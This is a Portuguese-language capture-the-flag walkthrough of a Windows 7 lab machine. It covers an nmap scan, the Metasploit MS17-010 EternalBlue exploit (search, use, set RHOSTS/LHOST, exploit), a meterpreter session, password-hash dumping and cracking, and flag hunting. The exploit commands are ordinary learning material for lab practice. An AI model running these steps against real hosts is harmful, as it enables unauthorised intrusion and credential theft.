## Recon
Quantidades de portas abertas:

```shell
nmap 10.80.161.48 -p 0-1002 -sV
```

![Scan](./imgs/Pasted%20image%2020260212231538.png)

Temos a porta 445 que rodar **microsoft-ds** com o windows 7, se jogarmos isso no google, conseguimos encontrar 
![Resultado do Search](imgs/Pasted%20image%2020260212232409.png)

Agore temos um exploit, podemos partir para parte de ganhar acesso.


## Gain Acess

Após iniciar o Metasploit

```shell
msfconsole
```

Podemos utilizar a busca usando o `search`
``` bash
search MS17-010
```

![Buscando](./imgs/Pasted%20image%2020260212232727.png)

setando  o  eternalblue como exploit
```
use exploit/windows/smb/ms17_010_eternalblue
```
Agora é só utilizar o exploit e configurar o RHOSTS :

![Configuração](imgs/Pasted%20image%2020260213005243.png)
```
set RHOSTS <ip-alvo>
set LHOSTS <seu-ip>
```

Logo após só precisando executar com:
```
exploit
```

Esse exploit já tem o meterpreter configurado por padrão e escalona os serviços.
## Cracking Hash

Agora precisaremos conseguir as senhas dos usuarios:
![Coleta hash](imgs/Pasted%20image%2020260213005830.png)

pegando essas hashs do SO podemos verificar qual é a senha.
![quebra de hash](imgs/Pasted%20image%2020260213010012.png)

## Encontrando flags

A primeira flag está no `C:\`

e para encontrar o resto irei usar  o `search` para encontrara as outras:
![busca de flag](imgs/Pasted%20image%2020260213010436.png)